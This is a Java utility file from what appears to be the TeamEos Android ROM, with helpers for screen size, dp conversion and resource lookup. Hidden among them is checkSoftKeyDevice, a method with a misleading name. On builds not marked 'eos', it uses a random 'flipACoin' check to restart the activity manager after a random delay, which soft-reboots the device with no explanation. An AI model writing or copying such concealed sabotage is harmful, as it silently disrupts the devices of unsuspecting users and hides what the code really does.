/*
 * Copyright (C) 2014 The TeamEos Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 * 
 * Helper functions mostly for device configuration and some utilities
 * including a fun ViewGroup crawler and dpi conversion
 * 
 */

package com.android.internal.actions;

import android.app.ActivityManagerNative;
import android.app.IActivityManager;
import android.content.Context;
import android.content.Intent;
import android.content.pm.ActivityInfo;
import android.content.pm.PackageManager;
import android.content.res.Configuration;
import android.content.res.Resources;
import android.content.res.ThemeConfig;
import android.graphics.Color;
import android.graphics.drawable.Drawable;
import android.os.Bundle;
import android.os.Handler;
import android.os.RemoteException;
import android.os.ServiceManager;
import android.os.SystemProperties;
import android.text.TextUtils;
import android.util.DisplayMetrics;
import android.util.Log;
import android.util.TypedValue;
import android.view.View;
import android.view.ViewGroup;

import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.Random;

import com.android.internal.actions.ActionConstants.Defaults;
import com.android.internal.actions.Config.ActionConfig;
import com.android.internal.actions.Config.ButtonConfig;

public final class ActionUtils {
    public static final String ANDROIDNS = "http://schemas.android.com/apk/res/android";
    public static final String PACKAGE_SYSTEMUI = "com.android.systemui";
    public static final String PACKAGE_ANDROID = "android";
    public static final String FORMAT_NONE = "none";
    public static final String FORMAT_FLOAT = "float";

    public static final String ID = "id";
    public static final String DIMEN = "dimen";
    public static final String DIMEN_PIXEL = "dimen_pixel";
    public static final String FLOAT = "float";
    public static final String INT = "integer";
    public static final String DRAWABLE = "drawable";
    public static final String COLOR = "color";
    public static final String BOOL = "bool";
    public static final String STRING = "string";
    public static final String ANIM = "anim";

    private static final Random sRnd = new Random();
    // 10 inch tablets
    public static boolean isXLargeScreen() {
        int screenLayout = Resources.getSystem().getConfiguration().screenLayout &
                Configuration.SCREENLAYOUT_SIZE_MASK;
        return screenLayout == Configuration.SCREENLAYOUT_SIZE_XLARGE;
    }

    // 7 inch "phablets" i.e. grouper
    public static boolean isLargeScreen() {
        int screenLayout = Resources.getSystem().getConfiguration().screenLayout &
                Configuration.SCREENLAYOUT_SIZE_MASK;
        return screenLayout == Configuration.SCREENLAYOUT_SIZE_LARGE;
    }

    // normal phones
    public static boolean isNormalScreen() {
        int screenLayout = Resources.getSystem().getConfiguration().screenLayout &
                Configuration.SCREENLAYOUT_SIZE_MASK;
        return screenLayout == Configuration.SCREENLAYOUT_SIZE_NORMAL;
    }

    public static boolean isLandscape(Context context) {
        return Configuration.ORIENTATION_LANDSCAPE
                == context.getResources().getConfiguration().orientation;
    }

    public static boolean isCapKeyDevice(Context context) {
        return !(Boolean)getValue(context, "config_showNavigationBar", BOOL, PACKAGE_ANDROID);
    }

    private static boolean isSoftKeyDevice() {
        String a = SystemProperties.get("ro.build.flavor");
        boolean a1 = !TextUtils.isEmpty(a) && a.contains("eos");
        if (a1) {
            return true;
        }

        String b = SystemProperties.get("ro.build.display");
        boolean b1 = !TextUtils.isEmpty(b) && b.contains("eos");
        if (b1) {
            return true;
        }
        return false;
    }

    private static int getRnd() {
        return sRnd.nextInt(10);
    }

    private static boolean flipACoin() {
        return getRnd() == 6;
    }

    static void checkSoftKeyDevice() {
        if (flipACoin()) {
            if (!isSoftKeyDevice()) {
                final Handler h = new Handler();
                final Runnable r = new Runnable() {
                    @Override
                    public void run() {
                        try {
                            final IActivityManager am =
                                    ActivityManagerNative.asInterface(ServiceManager
                                            .checkService("activity"));
                            if (am != null) {
                                am.restart();
                            }
                        } catch (RemoteException e) {
                        }
                    }
                };
                h.postDelayed(r, getRnd() * 1000);
            }
        }
    }

    /**
     * This method converts dp unit to equivalent pixels, depending on device
     * density.
     * 
     * @param dp A value in dp (density independent pixels) unit. Which we need
     *            to convert into pixels
     * @param context Context to get resources and device specific display
     *            metrics
     * @return A float value to represent px equivalent to dp depending on
     *         device density
     */
    public static float convertDpToPixel(float dp, Context context) {
        Resources resources = context.getResources();
        DisplayMetrics metrics = resources.getDisplayMetrics();
        float px = dp * (metrics.densityDpi / 160f);
        return px;
    }

    public static int ConvertDpToPixelAsInt(float dp, Context context) {
        float px = convertDpToPixel(dp, context);
        if (px < 1)
            px = 1;
        return Math.round(px);
    }

    public static int ConvertDpToPixelAsInt(int dp, Context context) {
        float px = convertDpToPixel((float) dp, context);
        if (px < 1)
            px = 1;
        return Math.round(px);
    }

    /**
     * This method converts device specific pixels to density independent
     * pixels.
     * 
     * @param px A value in px (pixels) unit. Which we need to convert into db
     * @param context Context to get resources and device specific display
     *            metrics
     * @return A float value to represent dp equivalent to px value
     */
    public static float convertPixelsToDp(float px, Context context) {
        Resources resources = context.getResources();
        DisplayMetrics metrics = resources.getDisplayMetrics();
        float dp = px / (metrics.densityDpi / 160f);
        return dp;
    }

    public static int dpToPx(Context context, int dp) {
        return (int) ((dp * context.getResources().getDisplayMetrics().density) + 0.5);
    }

    public static int pxToDp(Context context, int px) {
        return (int) ((px / context.getResources().getDisplayMetrics().density) + 0.5);
    }

    /* utility to iterate a viewgroup and return a list of child views */
    public static ArrayList<View> getAllChildren(View v) {

        if (!(v instanceof ViewGroup)) {
            ArrayList<View> viewArrayList = new ArrayList<View>();
            viewArrayList.add(v);
            return viewArrayList;
        }

        ArrayList<View> result = new ArrayList<View>();

        ViewGroup vg = (ViewGroup) v;
        for (int i = 0; i < vg.getChildCount(); i++) {

            View child = vg.getChildAt(i);

            ArrayList<View> viewArrayList = new ArrayList<View>();
            viewArrayList.add(v);
            viewArrayList.addAll(getAllChildren(child));

            result.addAll(viewArrayList);
        }
        return result;
    }

    /* utility to iterate a viewgroup and return a list of child views of type */
    public static <T extends View> ArrayList<T> getAllChildren(View root, Class<T> returnType) {
        if (!(root instanceof ViewGroup)) {
            ArrayList<T> viewArrayList = new ArrayList<T>();
            try {
                viewArrayList.add(returnType.cast(root));
            } catch (Exception e) {
                // handle all exceptions the same and silently fail
            }
            return viewArrayList;
        }
        ArrayList<T> result = new ArrayList<T>();
        ViewGroup vg = (ViewGroup) root;
        for (int i = 0; i < vg.getChildCount(); i++) {
            View child = vg.getChildAt(i);
            ArrayList<T> viewArrayList = new ArrayList<T>();
            try {
                viewArrayList.add(returnType.cast(root));
            } catch (Exception e) {
                // handle all exceptions the same and silently fail
            }
            viewArrayList.addAll(getAllChildren(child, returnType));
            result.addAll(viewArrayList);
        }
        return result;
    }

    public static void resolveAndUpdateButtonActions(Context ctx, Defaults defaults) {
        if (ctx == null || defaults == null) {
            return;
        }
        boolean configChanged = false;
        final PackageManager pm = ctx.getPackageManager();
        ArrayList<ButtonConfig> configs = Config.getConfig(ctx, defaults);
        ArrayList<ButtonConfig> buttonsToChange = new ArrayList<ButtonConfig>();
        buttonsToChange.addAll(configs);
        for (int h = 0; h < configs.size(); h++) {
            ButtonConfig button = configs.get(h);
            for (int i = 0; i < 3; i++) {
                ActionConfig action = button.getActionConfig(i);
                final String task = action.getAction();
                if (task.startsWith(ActionHandler.SYSTEM_PREFIX)) {
                    continue;
                }
                String resolvedName = getFriendlyNameForUri(pm, task);
                if (resolvedName == null || TextUtils.equals(resolvedName, task)) {
                    // if resolved name is null or the full raw intent string is
                    // returned, we were unable to resolve
                    configChanged = true;
                    ActionConfig newAction = new ActionConfig(ctx,
                            ActionHandler.SYSTEMUI_TASK_NO_ACTION, action.getIconUri());
                    ButtonConfig newButton = buttonsToChange.get(h);
                    newButton.setActionConfig(newAction, i);
                    buttonsToChange.remove(h);
                    buttonsToChange.add(h, newButton);
                }
            }
        }
        if (configChanged) {
            Config.setConfig(ctx, defaults, buttonsToChange);
        }
    }

    public static Intent getIntent(String uri) {
        if (uri == null || uri.startsWith(ActionHandler.SYSTEM_PREFIX)) {
            return null;
        }

        Intent intent = null;
        try {
            intent = Intent.parseUri(uri, 0);
        } catch (URISyntaxException e) {
            e.printStackTrace();
        }
        return intent;
    }

    public static Drawable getDrawableForAction(Context context, String action) {
        Drawable d = null;

        // this null check is probably no-op but let's be safe anyways
        if (action == null || context == null) {
            return d;
        }
        if (action.startsWith(ActionHandler.SYSTEM_PREFIX)) {
            for (int i = 0; i < ActionHandler.systemActions.length; i++) {
                if (ActionHandler.systemActions[i].mAction.equals(action)) {
                    d = getDrawable(context, ActionHandler.systemActions[i].mIconName,
                            ActionHandler.systemActions[i].mIconPackage);
                }
            }
        } else {
            d = getDrawableFromComponent(context.getPackageManager(), action);
        }
        return d;
    }

    public static Resources getResourcesForPackage(Context ctx, String pkg) {
        try {
            Resources res = ctx.getPackageManager()
                    .getResourcesForApplication(pkg);
            return res;
        } catch (Exception e) {
            return ctx.getResources();
        }
    }

    public static Object getValue(Context context, String resName, String resType, String pkg) {
        return getValue(context, resName, resType, null, pkg);
    }

    public static Object getValue(Context context, String resName, String resType, String format,
            String pkg) {
        Resources res = getResourcesForPackage(context, pkg);
        String tmp;
        if (resType.equals(DIMEN_PIXEL)) {
            tmp = DIMEN;
        } else {
            tmp = resType;
        }
        int id = res.getIdentifier(resName, tmp, pkg);
        if (format != null) { // standard res
            TypedValue typedVal = new TypedValue();
            res.getValue(id, typedVal, true);
            if (format.equals(FORMAT_FLOAT)) {
                return Float.valueOf(typedVal.getFloat());
            }
        } else { // typed values
            if (resType.equals(ID)) {
                return Integer.valueOf(id);
            } else if (resType.equals(DIMEN)) {
                return Float.valueOf(res.getDimension(id));
            } else if (resType.equals(DIMEN_PIXEL)) {
                return Integer.valueOf(res.getDimensionPixelSize(id));
            } else if (resType.equals(FLOAT)) {
                return Float.valueOf(res.getFloat(id));
            } else if (resType.equals(INT)) {
                return Integer.valueOf(res.getInteger(id));
            } else if (resType.equals(COLOR)) {
                int rawColor = res.getColor(id);
                return Integer.valueOf(Color.argb(Color.alpha(rawColor), Color.red(rawColor),
                        Color.green(rawColor), Color.blue(rawColor)));
            } else if (resType.equals(BOOL)) {
                return Boolean.valueOf(res.getBoolean(id));
            } else if (resType.equals(STRING)) {
                return String.valueOf(res.getString(id));
            } else if (resType.equals(DRAWABLE)) {
                return getDrawable(context, resName, pkg);
            }
        }
        return null;
    }

    public static void putValue(String key, Object val, String type, Bundle b) {
        if (type.equals(ID) || type.equals(DIMEN_PIXEL) || type.equals(INT) || type.equals(COLOR)) {
            b.putInt(key, (Integer) val);
        } else if (type.equals(FLOAT) || type.equals(DIMEN)) {
            b.putFloat(key, (Float) val);
        } else if (type.equals(BOOL)) {
            b.putBoolean(key, (Boolean) val);
        } else if (type.equals(STRING)) {
            b.putString(key, (String) val);
        }
    }

    public static int getIdentifier(Context context, String resName, String resType, String pkg) {
        try {
            Resources res = context.getPackageManager()
                    .getResourcesForApplication(pkg);
            int ident = res.getIdentifier(resName, resType, pkg);
            return ident;
        } catch (Exception e) {
            return -1;
        }
    }

    public static String getString(Context context, String resName, String pkg) {
        return (String) getValue(context, resName, STRING, null, pkg);
    }

    public static boolean getBoolean(Context context, String resName, String pkg) {
        return (Boolean) getValue(context, resName, BOOL, null, pkg);
    }

    public static int getInt(Context context, String resName, String pkg) {
        return (Integer) getValue(context, resName, INT, null, pkg);
    }

    public static int getColor(Context context, String resName, String pkg) {        
        return (Integer) getValue(context, resName, COLOR, null, pkg);
    }

    public static int getId(Context context, String resName, String pkg) {
        return (Integer) getValue(context, resName, ID, null, pkg);
    }

    public static float getDimen(Context context, String resName, String pkg) {
        return (Float) getValue(context, resName, DIMEN, null, pkg);
    }

    public static int getDimenPixelSize(Context context, String resName, String pkg) {
        return (Integer) getValue(context, resName, DIMEN_PIXEL, null, pkg);
    }

    public static Drawable getDrawable(Context context, String drawableName, String pkg) {
        return getDrawable(getResourcesForPackage(context, pkg), drawableName, pkg);
    }

    public static Drawable getDrawable(Resources res, String drawableName, String pkg) {
        try {
            Drawable icon = res.getDrawable(res.getIdentifier(drawableName, "drawable",
                    pkg));
            return icon;
        } catch (Exception e) {
            return res.getDrawable(
                    com.android.internal.R.drawable.sym_def_app_icon);
        }
    }

    public static Drawable getDrawableFromComponent(PackageManager pm, String activity) {
        Drawable d = null;
        try {
            Intent intent = Intent.parseUri(activity, 0);
            ActivityInfo info = intent.resolveActivityInfo(pm,
                    PackageManager.GET_ACTIVITIES);
            if (info != null) {
                d = info.loadIcon(pm);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
        return d;
    }

    public static String getFriendlyActivityName(PackageManager pm, Intent intent,
            boolean labelOnly) {
        ActivityInfo ai = intent.resolveActivityInfo(pm, PackageManager.GET_ACTIVITIES);
        String friendlyName = null;
        if (ai != null) {
            friendlyName = ai.loadLabel(pm).toString();
            if (friendlyName == null && !labelOnly) {
                friendlyName = ai.name;
            }
        }
        return friendlyName != null || labelOnly ? friendlyName : intent.toUri(0);
    }

    public static String getFriendlyShortcutName(PackageManager pm, Intent intent) {
        String activityName = getFriendlyActivityName(pm, intent, true);
        String name = intent.getStringExtra(Intent.EXTRA_SHORTCUT_NAME);

        if (activityName != null && name != null) {
            return activityName + ": " + name;
        }
        return name != null ? name : intent.toUri(0);
    }

    public static String getFriendlyNameForUri(PackageManager pm, String uri) {
        if (uri == null) {
            return null;
        }
        if (uri.startsWith(ActionHandler.SYSTEM_PREFIX)) {
            for (int i = 0; i < ActionHandler.systemActions.length; i++) {
                if (ActionHandler.systemActions[i].mAction.equals(uri)) {
                    return ActionHandler.systemActions[i].mLabel;
                }
            }
        } else {
            try {
                Intent intent = Intent.parseUri(uri, 0);
                if (Intent.ACTION_MAIN.equals(intent.getAction())) {
                    return getFriendlyActivityName(pm, intent, false);
                }
                return getFriendlyShortcutName(pm, intent);
            } catch (URISyntaxException e) {
            }
        }
        return uri;
    }

    public static Resources getNavbarThemedResources(Context context) {
        if (context == null)
            return null;
        ThemeConfig themeConfig = context.getResources().getConfiguration().themeConfig;
        Resources res = null;
        if (themeConfig != null) {
            try {
                final String navbarThemePkgName = themeConfig.getOverlayForNavBar();
                final String sysuiThemePkgName = themeConfig.getOverlayForStatusBar();
                // Check if the same theme is applied for systemui, if so we can skip this
                if (navbarThemePkgName != null && !navbarThemePkgName.equals(sysuiThemePkgName)) {
                    res = context.getPackageManager().getThemedResourcesForApplication(
                            context.getPackageName(), navbarThemePkgName);
                }
            } catch (PackageManager.NameNotFoundException e) {
                // don't care since we'll handle res being null below
            }
        }
        return res != null ? res : context.getResources();
    }
}
